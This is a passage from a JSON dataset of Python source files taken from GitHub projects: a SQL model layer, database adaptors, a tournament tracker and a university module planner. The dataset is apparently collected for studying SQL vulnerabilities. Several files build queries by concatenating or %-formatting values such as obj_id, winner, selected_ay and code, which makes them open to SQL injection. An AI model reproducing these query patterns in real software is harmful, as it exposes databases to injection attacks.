query_items)\n        else:\n            query = 'SELECT * FROM %s;' % (self.table_name)\n\n            answer = self.sql.perform(query)\n\n        return answer\n\n    def update(self, obj):\n        '''\n        Updates a single document\n        '''\n        obj_id = obj.get('id')\n        #Don't want to include the id in the data set to update.\n        del obj['id']\n        update_clause, query_params = self._build_update_clause(obj)\n        query = 'UPDATE ' + self.table_name + ' SET ' + update_clause + ' WHERE id=' + str(obj_id) + ';'\n        feedback = self.sql.perform(query, query_params)\n        return self.read({'id' : obj_id})[0]\n\n    def delete(self, obj_id):\n        '''\n        Deletes a single document\n        '''\n        query = 'DELETE FROM ' + self.table_name + ' WHERE id=' + self.holder\n        feedback = self.sql.perform(query, (obj_id,))\n        return feedback\n    \n    def _build_where_clause(self, query_params):\n        '''\n        Returns the WHERE clause and the tuple of items to pass in with the\n        string\n        '''\n        raw_clauses = []\n        query_items = []\n\n        for field, value in query_params.iteritems():\n            if field in self.where_params:\n                raw_clauses.append(field + '=' + self.holder)\n                query_items.append(value)\n            else:\n                raise ModelException(\"%s is not a valid where parameter\" % field)\n        raw_clause = ' AND '.join(raw_clauses)\n        return raw_clause, query_items\n\n    def _build_update_clause(self, obj):\n        '''\n        Returns a tuple of the key/value part of the UPDATE clause and the\n        query params\n        '''\n        raw_clauses = []\n        for field, value in obj.iteritems():\n            raw_clauses.append(field + '=' + self.holder)\n        raw_clause = ', '.join(raw_clauses)\n        return raw_clause, obj.values()\n\n\n    def _get_latest_id(self):\n        query = 'SELECT id FROM ' + self.table_name + ' ORDER BY id DESC LIMIT 1'\n        results = self.sql.perform(query)\n        if not results:\n            return 0 # the very first\n        return results[0]['id']\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/asascience-open/ooi-ui-services/blob/16af5464be22a18b64be4438d85f492ddb41a687",
        "file_path": "/ooiservices/model/adaptor/postgres.py",
        "source": "#!/usr/bin/env python\n'''\nooiservices.adaptor.postgresadaptor\n\nDefinitions for the PostgresAdaptor\n'''\n\n__author__ = 'Edna Donoughe'\n\nimport psycopg2\nimport psycopg2.extras\n\nclass PostgresAdaptor(object):\n    database = None\n    username = None\n    password = None\n    host     = None\n    port     = None\n\n    def __init__(self, database=None, username=None, password=None, host=None, port=None):\n        object.__init__(self)\n        self.database = database\n        self.username = username\n        self.password = password\n        self.host = host\n        self.port = port\n\n    def get_db(self):\n        try:\n            conn = psycopg2.connect(database=self.database, user=self.username, password=self.password, host=self.host, port=self.port)\n            return conn\n        except psycopg2.DatabaseError, e:\n            raise Exception('<PostgresAdaptor> connect failed (check config): %s: ' % e)\n        except:\n            raise Exception('<PostgresAdaptor> get_db failed to connect; check config settings')\n\n    def perform(self, query, arg_list=None):\n        #Create a cursor_factory to return dictionary\n        conn = self.get_db()\n        try:\n\n            c = conn.cursor(cursor_factory = psycopg2.extras.RealDictCursor)\n            if arg_list:\n                c.execute(query, arg_list)\n            else:\n                c.execute(query)\n\n            result = c.fetchall()\n            conn.commit()\n\n        except psycopg2.DatabaseError, e:\n            raise Exception('<PostgresAdaptor> perform failed: %s: ' % e)\n\n        finally:\n            if conn:\n                conn.close()\n\n        return result",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/asascience-open/ooi-ui-services/blob/16af5464be22a18b64be4438d85f492ddb41a687",
        "file_path": "/ooiservices/model/adaptor/sqlite.py",
        "source": "#!/usr/bin/env python\n'''\nooiservices.adaptor.sqlite\n\nDefinitions for the SQLiteAdaptor\n'''\n\n__author__ = 'Matt Campbell'\n\nimport sqlite3 as lite\n\nclass SQLiteAdaptor(object):\n    db = None\n\n    def __init__(self,dbName):\n        object.__init__(self)\n        self.db = dbName\n\n    def get_db(self):\n        if self.db:\n            conn = lite.connect(self.db)\n            return conn\n\n    def perform(self, query, obj=None):\n        #Create a factory to return dictionary\n        def dict_factory(cursor, row):\n            d = {}\n            for idx, col in enumerate(cursor.description):\n                d[col[0]] = row[idx]\n            return d\n        conn = self.get_db()\n        conn.row_factory = dict_factory\n        c = conn.cursor()\n\n        try:\n            if lite.complete_statement(query):\n                if obj:\n                    c.execute(query, obj)\n                else:\n                    c.execute(query)\n\n            result = c.fetchall()\n            #possibly condition commit to only insert/update/delete.\n            conn.commit()\n\n        except lite.Error, e:\n            result = '%s' % e.args[0]\n            print query\n\n        finally:\n            if conn:\n                conn.close()\n        return result",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/asascience-open/ooi-ui-services/blob/16af5464be22a18b64be4438d85f492ddb41a687",
        "file_path": "/ooiservices/model/sqlmodel.py",
        "source": "#!/usr/bin/env python\n\n'''\nooiservices.model.sqlmodel\n\nSQLModel\n'''\n\nfrom ooiservices.exceptions import ModelException\nfrom ooiservices.config import DataSource\nfrom ooiservices.adaptor.postgres import PostgresAdaptor as PSQL\nfrom ooiservices.adaptor.sqlite import SQLiteAdaptor as SQL\nfrom ooiservices.model.base import BaseModel\n\nclass SqlModel(BaseModel):\n\n\n    def __init__(self):\n        '''\n        Instantiates new base model\n        '''\n        from ooiservices import get_db\n        # A really obscure bug that causes a severe headache down the road\n        BaseModel.__init__(self)\n        self.sql = get_db()\n        if (DataSource['DBType'] == 'sqlite'):\n            self.holder = '?'\n        elif (DataSource['DBType'] == 'psql'):\n            self.holder = '%s'\n        else:\n            raise ModelException('Unsupported Database: %s' % DataSource['DBType'])\n\n    #CRUD methods\n    def create(self, obj):\n        '''\n        Inserts a new row into the table based on the obj should be a\n        dictionary like where the keys are the column headers.\n        '''\n\n        if 'id' not in obj:\n            obj['id'] = self._get_latest_id() + 1\n\n        columns = ', '.join(obj.keys())\n        empties = ', '.join([self.holder for col in obj])\n        query = 'INSERT INTO ' + self.table_name + ' (' + columns + ') VALUES (' + empties + ');'\n        feedback = self.sql.perform(query, obj.values())\n\n\n        return obj\n\n\n    def read(self, query_params=None):\n        '''\n        Modified to (temporarily) support interim UI specification for output\n        '''\n        query_params = query_params or {}\n\n        if query_params:\n            where_clause, query_items = self._build_where_clause(query_params)\n            query = 'SELECT * FROM ' + self.table_name + ' WHERE ' + where_clause\n            answer = self.sql.perform(query, query_items)\n        else:\n            query = 'SELECT * FROM %s;' % (self.table_name)\n\n            answer = self.sql.perform(query)\n\n        return answer\n\n    def update(self, obj):\n        '''\n        Updates a single document\n        '''\n        obj_id = obj.get('id')\n        #Don't want to include the id in the data set to update.\n        del obj['id']\n        update_clause, query_params = self._build_update_clause(obj)\n        query = 'UPDATE ' + self.table_name + ' SET ' + update_clause + ' WHERE id=' + str(obj_id) + ';'\n        feedback = self.sql.perform(query, query_params)\n        return self.read({'id' : obj_id})[0]\n\n    def delete(self, obj_id):\n        '''\n        Deletes a single document\n        '''\n        query = 'DELETE FROM ' + self.table_name + ' WHERE id=' + self.holder\n        feedback = self.sql.perform(query, (obj_id,))\n        return feedback\n    \n    def _build_where_clause(self, query_params):\n        '''\n        Returns the WHERE clause and the tuple of items to pass in with the\n        string\n        '''\n        raw_clauses = []\n        query_items = []\n\n        for field, value in query_params.iteritems():\n            if field in self.where_params:\n                raw_clauses.append(field + '=' + self.holder)\n                query_items.append(value)\n            else:\n                raise ModelException(\"%s is not a valid where parameter\" % field)\n        raw_clause = ' AND '.join(raw_clauses)\n        return raw_clause, query_items\n\n    def _build_update_clause(self, obj):\n        '''\n        Returns a tuple of the key/value part of the UPDATE clause and the\n        query params\n        '''\n        raw_clauses = []\n        for field, value in obj.iteritems():\n            raw_clauses.append(field + '=' + self.holder)\n        raw_clause = ', '.join(raw_clauses)\n        return raw_clause, obj.values()\n\n\n    def _get_latest_id(self):\n        query = 'SELECT id FROM ' + self.table_name + ' ORDER BY id DESC LIMIT 1'\n        results = self.sql.perform(query)\n        if not results:\n            return 0 # the very first\n        return results[0]['id']\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/juanchopanza/Tournament/blob/200af53343f7a71c68446bb0fc38c23a6dcc1e40",
        "file_path": "/vagrant/tournament/tournament.py",
        "source": "#!/usr/bin/env python\n#\n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\nfrom itertools import izip_longest\n\nDBNAME = 'tournament'\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=%s\" % DBNAME)\n\n\ndef _commit(query):\n    '''Connext, commit query, and close\n\n    TODO:\n        Do we really neer to open and close each time?\n    '''\n    c = connect()\n    c.cursor().execute(query)\n    c.commit()\n    c.close()\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    _commit('DELETE FROM matches')\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    _commit('DELETE FROM players')\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    c = connect()\n    cur = c.cursor()\n    cur.execute('SELECT COUNT(*) from players;')\n    res = cur.fetchone()[0]\n    c.close()\n    return res\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n\n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n\n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n    c = connect()\n    c.cursor().execute('INSERT INTO players(name) VALUES (%s)', (name,))\n    c.commit()\n    c.close()\n\n\n#  TODO: make into a view?\nSTANDINGS_QUERY = '''\nSELECT players.id as id,\n       players.name as name,\n       (SELECT COUNT(*) FROM matches WHERE players.id = matches.winner_id) as wins,\n       (SELECT COUNT(*) FROM matches WHERE players.id = matches.winner_id or players.id = matches.loser_id) as matches\nFROM players ORDER BY wins DESC;\n'''\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    c = connect()\n    cur = c.cursor()\n    cur.execute(STANDINGS_QUERY)\n    res = cur.fetchall()\n    c.close()\n    return res\n\n\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n\n    Raises:\n        ValueError is pairing already registered or winner == loser\n    \"\"\"\n    c = connect()\n    cur = c.cursor()\n\n    def _checkPairing():\n        if winner == loser:\n            raise ValueError('Attempt to match player against self')\n\n        q = '''\n        SELECT COUNT(*) FROM matches\n        WHERE (matches.winner_id = %s AND matches.loser_id = %s)\n              OR (matches.winner_id = %s AND matches.loser_id = %s);\n        ''' % (winner, loser, loser, winner)\n        cur.execute(q)\n        if cur.fetchone()[0] > 0:\n            raise ValueError('Pairing %s, %s already played' % (winner, loser))\n\n    _checkPairing()\n\n    cur.execute(\n        'INSERT INTO matches(winner_id, loser_id) VALUES (%s, %s)',\n        (winner, loser))\n    c.commit()\n    c.close()\n\n\ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n\n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n\n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n\n    # Standings lists players ordered by number of wins. We construct the\n    # swiss pairings from consecutive entries in the standings list. These have\n    # the closest number of wins by definition.\n    # We use a grouper function to iterate over the standings list in groups\n    # of two consecutive elements without overlap.\n    # TODO: extend for odd numbers\n\n    def grouper(iterable, n, fillvalue=None):\n        '''Collect data into fixed-length chunks or blocks\n\n        Taken from  itertools documentation:\n            https://docs.python.org/2/library/itertools.html\n\n        grouper('ABCDEFG', 3, 'x') --> ABC DEF Gxx\n        '''\n        args = [iter(iterable)] * n\n        return izip_longest(fillvalue=fillvalue, *args)\n\n    standings = playerStandings()\n    pairings = [(a[0], a[1], b[0], b[1])\n                for a, b in grouper(standings, 2)]\n\n    return pairings\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/nus-mtp/cs-modify/blob/7b5713bcaacbf554ddd6aa7f73510d5bb51fc203",
        "file_path": "/components/model.py",
        "source": "'''\n    model.py\n    Handles queries to the database\n'''\n\nimport hashlib\nimport components.database_adapter # database_adaptor.py handles the connection to database\nimport psycopg2\n\n## Connects to the postgres database\nCONNECTION = components.database_adapter.connect_db()\nDB_CURSOR = CONNECTION.cursor()\n\n\ndef get_all_modules():\n    '''\n        Get the module code, name, description, and MCs of all modules\n    '''\n    sql_command = \"SELECT * FROM module ORDER BY code\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_module(code):\n    '''\n        Get the module code, name, description and MCs of a single module\n    '''\n    sql_command = \"SELECT * FROM module WHERE code=%s\"\n    DB_CURSOR.execute(sql_command, (code,))\n    return DB_CURSOR.fetchone()\n\n\ndef get_all_fixed_mounted_modules():\n    '''\n        Get the module code, name, AY/Sem and quota of all fixed mounted modules\n    '''\n    sql_command = \"SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota \" +\\\n                    \"FROM module m1, moduleMounted m2 WHERE m2.moduleCode = m1.code \" +\\\n                    \"ORDER BY m2.moduleCode, m2.acadYearAndSem\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_all_tenta_mounted_modules():\n    '''\n        Get the module code, name, AY/Sem and quota of all tentative mounted modules\n    '''\n    sql_command = \"SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota \" +\\\n                    \"FROM module m1, moduleMountTentative m2 WHERE m2.moduleCode = m1.code \" +\\\n                    \"ORDER BY m2.moduleCode, m2.acadYearAndSem\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_all_tenta_mounted_modules_of_selected_ay(selected_ay):\n    '''\n        Get the module code, name, AY/Sem and quota of all tenta mounted mods of a selected AY\n    '''\n    sql_command = \"SELECT m2.moduleCode, m1.name, m2.acadYearAndSem, m2.quota \" +\\\n                  \"FROM module m1, moduleMountTentative m2 WHERE m2.moduleCode = m1.code \" +\\\n                  \"AND M2.acadYearAndSem LIKE '\" + selected_ay + \"%' \" +\\\n                  \"ORDER BY m2.moduleCode, m2.acadYearAndSem\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_first_fixed_mounting():\n    '''\n        Get the first mounting from the fixed mounting table\n        This is used for reading the current AY\n    '''\n    sql_command = \"SELECT acadYearAndSem FROM moduleMounted LIMIT(1)\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchone()\n\n\ndef get_all_fixed_ay_sems():\n    '''\n        Get all the distinct AY/Sem in the fixed mounting table\n    '''\n    sql_command = \"SELECT DISTINCT acadYearAndSem FROM moduleMounted \" +\\\n                  \"ORDER BY acadYearAndSem ASC\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_all_tenta_ay_sems():\n    '''\n        Get all the distinct AY/Sem in the tentative mounting table\n    '''\n    sql_command = \"SELECT DISTINCT acadYearAndSem FROM moduleMountTentative \" +\\\n                  \"ORDER BY acadYearAndSem ASC\"\n    DB_CURSOR.execute(sql_command)\n    return DB_CURSOR.fetchall()\n\n\ndef get_fixed_mounting_and_quota(code):\n    '''\n        Get the fixed AY/Sem and quota of a mounted module\n    '''\n    sql_command = \"SELECT acadYearAndSem, quota FROM moduleMounted \" +\\\n                  \"WHERE moduleCode=%s ORDER BY acadYearAndSem ASC\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    return DB_CURSOR.fetchall()\n\n\ndef get_tenta_mounting_and_quota(code):\n    '''\n        Get the tentative AY/Sem and quota of a mounted module\n    '''\n    sql_command = \"SELECT acadYearAndSem, quota FROM moduleMountTentative \" +\\\n                  \"WHERE moduleCode=%s ORDER BY acadYearAndSem ASC\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    return DB_CURSOR.fetchall()\n\n\ndef get_quota_of_target_fixed_ay_sem(code, ay_sem):\n    '''\n        Get the quota of a mod in a target fixed AY/Sem (if any)\n    '''\n    sql_command = \"SELECT quota FROM moduleMounted \" +\\\n                  \"WHERE moduleCode=%s AND acadYearAndSem=%s \"\n    DB_CURSOR.execute(sql_command, (code, ay_sem))\n    return DB_CURSOR.fetchall()\n\n\ndef get_quota_of_target_tenta_ay_sem(code, ay_sem):\n    '''\n        Get the quota of a mod in a target tentative AY/Sem (if any)\n    '''\n    sql_command = \"SELECT quota FROM moduleMountTentative \" +\\\n                  \"WHERE moduleCode=%s AND acadYearAndSem=%s \"\n    DB_CURSOR.execute(sql_command, (code, ay_sem))\n    return DB_CURSOR.fetchall()\n\n\ndef get_number_students_planning(code):\n    '''\n        Get the number of students planning to take a mounted module\n    '''\n    sql_command = \"SELECT COUNT(*), acadYearAndSem FROM studentPlans WHERE \" +\\\n                    \"moduleCode=%s GROUP BY acadYearAndSem ORDER BY acadYearAndSem\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    return DB_CURSOR.fetchall()\n\n\ndef add_module(code, name, description, module_credits, status):\n    '''\n        Insert a module into the module table.\n        Returns true if successful, false if duplicate primary key detected\n    '''\n    sql_command = \"INSERT INTO module VALUES (%s,%s,%s,%s,%s)\"\n    try:\n        DB_CURSOR.execute(sql_command, (code, name, description, module_credits, status))\n        CONNECTION.commit()\n    except psycopg2.IntegrityError:        # duplicate key error\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef update_module(code, name, description, module_credits):\n    '''\n        Update a module with edited info\n    '''\n    sql_command = \"UPDATE module SET name=%s, description=%s, mc=%s \" +\\\n                  \"WHERE code=%s\"\n    try:\n        DB_CURSOR.execute(sql_command, (name, description, module_credits, code))\n        CONNECTION.commit()\n    except psycopg2.Error:\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef flag_module_as_removed(code):\n    '''\n        Change the status of a module to 'To Be Removed'\n    '''\n    sql_command = \"UPDATE module SET status='To Be Removed' WHERE code=%s\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    CONNECTION.commit()\n\n\ndef flag_module_as_active(code):\n    '''\n        Change the status of a module to 'Active'\n    '''\n    sql_command = \"UPDATE module SET status='Active' WHERE code=%s\"\n    DB_CURSOR.execute(sql_command, (code, ))\n    CONNECTION.commit()\n\n\ndef delete_module(code):\n    '''\n        Delete a module from the module table\n    '''\n    # Delete the foreign key reference first.\n    sql_command = \"DELETE FROM modulemounted WHERE modulecode=%s\"\n    DB_CURSOR.execute(sql_command, (code,))\n\n    # Perform the normal delete.\n    sql_command = \"DELETE FROM module WHERE code=%s\"\n    DB_CURSOR.execute(sql_command, (code,))\n    CONNECTION.commit()\n\n\ndef get_oversub_mod():\n    '''\n        Retrieves a list of modules which are oversubscribed.\n        Returns module, AY/Sem, quota, number students interested\n        i.e. has more students interested than the quota\n    '''\n    list_of_oversub_with_info = []\n    list_all_mod_info = get_all_modules()\n\n    for module_info in list_all_mod_info:\n        mod_code = module_info[0]\n\n        aysem_quota_fixed_list = get_fixed_mounting_and_quota(mod_code)\n        aysem_quota_tenta_list = get_tenta_mounting_and_quota(mod_code)\n        aysem_quota_merged_list = aysem_quota_fixed_list + \\\n                                aysem_quota_tenta_list\n\n        num_student_plan_aysem_list = get_number_students_planning(mod_code)\n        for num_plan_aysem_pair in num_student_plan_aysem_list:\n            num_student_planning = num_plan_aysem_pair[0]\n            ay_sem = num_plan_aysem_pair[1]\n            real_quota = get_quota_in_aysem(ay_sem, aysem_quota_merged_list)\n\n            # ensures that quota will be a number which is not None\n            if real_quota is None:\n                quota = 0\n                real_quota = '?'\n            else:\n                quota = real_quota\n\n            if num_student_planning > quota:\n                oversub_info = (mod_code, ay_sem, real_quota, num_student_planning)\n                list_of_oversub_with_info.append(oversub_info)\n\n    return list_of_oversub_with_info\n\n\ndef get_quota_in_aysem(ay_sem, aysem_quota_merged_list):\n    '''\n        This is a helper function.\n        Retrieves the correct quota from ay_sem listed inside\n        aysem_quota_merged_list parameter.\n    '''\n    for aysem_quota_pair in aysem_quota_merged_list:\n        aysem_in_pair = aysem_quota_pair[0]\n        if ay_sem == aysem_in_pair:\n            quota_in_pair = aysem_quota_pair[1]\n\n            return quota_in_pair\n\n    return None # quota not found in list\n\n\ndef add_admin(username, salt, hashed_pass):\n    '''\n        Register an admin into the database.\n        Note: to change last argument to false once\n        activation done\n    '''\n    sql_command = \"INSERT INTO admin VALUES (%s, %s, %s, FALSE, TRUE)\"\n    DB_CURSOR.execute(sql_command, (username, salt, hashed_pass))\n    CONNECTION.commit()\n\n\ndef is_userid_taken(userid):\n    '''\n        Retrieves all account ids for testing if a user id supplied\n        during account creation\n    '''\n    sql_command = \"SELECT staffid FROM admin WHERE staffID=%s\"\n    DB_CURSOR.execute(sql_command, (userid,))\n\n    result = DB_CURSOR.fetchall()\n    return len(result) != 0\n\n\ndef delete_admin(username):\n    '''\n        Delete an admin from the database.\n    '''\n    # Delete the foreign key references first.\n    sql_command = \"DELETE FROM starred WHERE staffID=%s\"\n    DB_CURSOR.execute(sql_command, (username,))\n\n    sql_command = \"DELETE FROM admin WHERE staffID=%s\"\n    DB_CURSOR.execute(sql_command, (username,))\n    CONNECTION.commit()\n\n\ndef validate_admin(username, unhashed_pass):\n    '''\n        Check if a provided admin-password pair is valid.\n    '''\n    sql_command = \"SELECT salt, password FROM admin WHERE staffID=%s\"\n    DB_CURSOR.execute(sql_command, (username,))\n    admin = DB_CURSOR.fetchall()\n    if not admin:\n        return False\n    else:\n        hashed_pass = hashlib.sha512(unhashed_pass + admin[0][0]).hexdigest()\n        is_valid = (admin[0][1] == hashed_pass)\n        return is_valid\n\n\ndef add_fixed_mounting(code, ay_sem, quota):\n    '''\n        Insert a new mounting into fixed mounting table\n    '''\n    try:\n        sql_command = \"INSERT INTO modulemounted VALUES (%s,%s,%s)\"\n        DB_CURSOR.execute(sql_command, (code, ay_sem, quota))\n        CONNECTION.commit()\n    except psycopg2.IntegrityError:        # duplicate key error\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef delete_fixed_mounting(code, ay_sem):\n    '''\n        Delete a mounting from the fixed mounting table\n    '''\n    sql_command = \"DELETE FROM modulemounted WHERE moduleCode=%s AND acadYearAndSem=%s\"\n    DB_CURSOR.execute(sql_command, (code, ay_sem))\n    CONNECTION.commit()\n\n\ndef add_tenta_mounting(code, ay_sem, quota):\n    '''\n        Insert a new mounting into tentative mounting table\n    '''\n    try:\n        sql_command = \"INSERT INTO moduleMountTentative VALUES (%s,%s,%s)\"\n        DB_CURSOR.execute(sql_command, (code, ay_sem, quota))\n        CONNECTION.commit()\n    except psycopg2.IntegrityError:        # duplicate key error\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef update_quota(code, ay_sem, quota):\n    '''\n        Update the quota of a module in a target tentative AY/Sem\n    '''\n    sql_command = \"UPDATE moduleMountTentative SET quota=%s \" +\\\n                  \"WHERE moduleCode=%s AND acadYearAndSem=%s\"\n    try:\n        DB_CURSOR.execute(sql_command, (quota, code, ay_sem))\n        CONNECTION.commit()\n    except psycopg2.Error:\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef delete_tenta_mounting(code, ay_sem):\n    '''\n        Delete a mounting from the tentative mounting table\n    '''\n    sql_command = \"DELETE FROM moduleMountTentative WHERE moduleCode=%s AND acadYearAndSem=%s\"\n    try:\n        DB_CURSOR.execute(sql_command, (code, ay_sem))\n        CONNECTION.commit()\n    except psycopg2.Error:\n        CONNECTION.rollback()\n        return False\n    return True\n\n\ndef get_num_students_by_yr_study():\n    '''\n        Retrieves the number of students at each year of study as a table\n        Each row will contain (year, number of students) pair.\n        e.g. [(1, 4), (2, 3)] means four year 1 students\n        and two year 3 students\n    '''\n    INDEX_FIRST_ELEM = 0\n\n    sql_command = \"SELECT year, COUNT(*) FROM student GROUP BY year\" + \\\n        \" ORDER BY year\"\n    DB_CURSOR.execute(sql_command)\n\n    table_with_non_zero_students = DB_CURSOR.fetchall()\n    final_table = append_missing_year_of_study(table_with_non_zero_students)\n\n    # Sort the table based on year\n    final_table.sort(key=lambda row: row[INDEX_FIRST_ELEM])\n\n    return final_table\n\n\ndef append_missing_year_of_study(initial_table):\n    '''\n        Helper function to append missing years of study to the\n        given initial table.\n        initial_table given in lists of (year, number of students)\n        pair.\n        e.g. If year 5 is missing from table, appends (5,0) to table\n        and returns the table\n    '''\n    MAX_POSSIBLE_YEAR = 6\n    for index in range(0, MAX_POSSIBLE_YEAR):\n        year = index + 1\n        year_exists_in_table = False\n\n        for year_count_pair in initial_table:\n            req_year = year_count_pair[0]\n            if req_year == year:\n                year_exists_in_table = True\n                break\n\n        if not year_exists_in_table:\n            initial_table.append((year, 0))\n\n    return initial_table\n\n\ndef get_num_students_by_focus_area_non_zero():\n    '''\n        Retrieves the number of students for each focus area as a table,\n        if no student is taking that focus area, that row will not be\n        returned.\n        Each row will contain (focus area, number of students) pair.\n        See: get_num_students_by_focus_areas() for more details.\n    '''\n    sql_command = \"SELECT f.name, COUNT(*) FROM focusarea f, takesfocusarea t\" + \\\n        \" WHERE f.name = t.focusarea1 OR f.name = t.focusarea2 GROUP BY f.name\"\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchall()\n\n\ndef get_focus_areas_with_no_students_taking():\n    '''\n        Retrieves a list of focus areas with no students taking.\n    '''\n    sql_command = \"SELECT f2.name FROM focusarea f2 WHERE NOT EXISTS(\" + \\\n        \"SELECT f.name FROM focusarea f, takesfocusarea t \" + \\\n        \"WHERE (f.name = t.focusarea1 OR f.name = t.focusarea2) \" + \\\n        \"AND f2.name = f.name GROUP BY f.name)\"\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchall()\n\n\ndef get_number_students_without_focus_area():\n    '''\n        Retrieves the number of students who have not indicated their focus\n        area.\n    '''\n    sql_command = \"SELECT COUNT(*) FROM takesfocusarea WHERE \" + \\\n        \"focusarea1 IS NULL AND focusarea2 IS NULL\"\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchone()\n\n\ndef get_num_students_by_focus_areas():\n    '''\n        Retrieves the number of students for each focus area as a table\n        Each row will contain (focus area, number of students) pair\n        e.g. [(AI, 4), (Database, 3)] means four students taking AI as\n        focus area and three students taking database as focus area.\n        Note: A student taking double focus on AI and Database will be\n        reflected once for AI and once for database (i.e. double counting)\n    '''\n    INDEX_FIRST_ELEM = 0\n\n    table_with_non_zero_students = get_num_students_by_focus_area_non_zero()\n    table_with_zero_students = get_focus_areas_with_no_students_taking()\n\n    temp_table = table_with_non_zero_students\n\n    # Loops through all focus areas with no students taking and add them to\n    # the table with (focus area, number of students) pair.\n    for focus_area_name in table_with_zero_students:\n        temp_table.append((focus_area_name[INDEX_FIRST_ELEM], 0))\n\n    # Sort the table based on focus area\n    temp_table.sort(key=lambda row: row[INDEX_FIRST_ELEM])\n\n    # Build the final table with info of students without focus area.\n    num_students_without_focus = \\\n    get_number_students_without_focus_area()[INDEX_FIRST_ELEM]\n\n    temp_table.insert(INDEX_FIRST_ELEM,\n                      (\"Have Not Indicated\", num_students_without_focus))\n    final_table = temp_table\n\n    return final_table\n\ndef get_mod_taken_together_with(code):\n    '''\n        Retrieves the list of modules taken together with the specified\n        module code in the same semester.\n\n        Returns a table of lists (up to 10 top results). Each list contains\n        (specified code, module code of mod taken together, aySem, number of students)\n\n        e.g. [(CS1010, CS1231, AY 16/17 Sem 1, 5)] means there are 5 students\n        taking CS1010 and CS1231 together in AY 16/17 Sem 1.\n    '''\n    NUM_TOP_RESULTS_TO_RETURN = 10\n\n    sql_command = \"SELECT sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem, COUNT(*) \" + \\\n                \"FROM studentPlans sp1, studentPlans sp2 \" + \\\n                \"WHERE sp1.moduleCode = '\" + code + \"' AND \" + \\\n                \"sp2.moduleCode <> sp1.moduleCode AND \" + \\\n                \"sp1.studentId = sp2.studentId AND \" + \\\n                \"sp1.acadYearAndSem = sp2.acadYearAndSem \" + \\\n                \"GROUP BY sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem \" + \\\n                \"ORDER BY COUNT(*) DESC\"\n\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchmany(NUM_TOP_RESULTS_TO_RETURN)\n\ndef get_all_mods_taken_together():\n    '''\n        Retrieves the list of all modules taken together in the same semester.\n\n        Returns a table of lists. Each list contains\n        (module code 1, module code 2, aySem, number of students)\n        where module code 1 and module code 2 are the 2 mods taken together\n        in the same semester.\n\n        e.g. [(CS1010, CS1231, AY 16/17 Sem 1, 5)] means there are 5 students\n        taking CS1010 and CS1231 together in AY 16/17 Sem 1.\n    '''\n\n    sql_command = \"SELECT sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem, COUNT(*) \" + \\\n                \"FROM studentPlans sp1, studentPlans sp2 \" + \\\n                \"WHERE sp1.moduleCode < sp2.moduleCode AND \" + \\\n                \"sp1.studentId = sp2.studentId AND \" + \\\n                \"sp1.acadYearAndSem = sp2.acadYearAndSem \" + \\\n                \"GROUP BY sp1.moduleCode, sp2.moduleCode, sp1.acadYearAndSem \" + \\\n                \"ORDER BY COUNT(*) DESC\"\n\n    DB_CURSOR.execute(sql_command)\n\n    return DB_CURSOR.fetchall()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/nus-mtp/cs-modify/blob/719faacc0cffcb9cba9b4a942b914f423f4913d4",
        "file_path": "/components/model.py",
